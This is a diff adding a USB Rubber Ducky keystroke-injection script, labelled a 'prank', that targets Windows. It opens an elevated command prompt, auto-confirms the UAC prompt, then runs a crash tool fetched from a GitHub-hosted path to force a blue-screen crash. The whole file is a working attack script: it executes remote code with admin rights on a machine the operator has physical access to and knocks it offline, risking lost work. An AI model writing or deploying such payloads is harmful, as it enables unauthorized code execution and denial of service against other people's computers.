@@ -1,0 +1,18 @@
+REM Title: BSOD_githosted WIP
+REM Author: FalsePhilosopher
+REM Target: Win
+REM Props: Hak5, the community and memes
+REM Version: 1.0
+REM Category: Prank
+REM Invokes a BSOD from a microsoft developer tool
+REM startup delay
+DELAY 300
+GUI r
+DELAY 500
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 1000
+STRING \\github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Win/BSOD/bsod/notmyfaultc64.exe crash 0x05 /accepteula
+ENTER
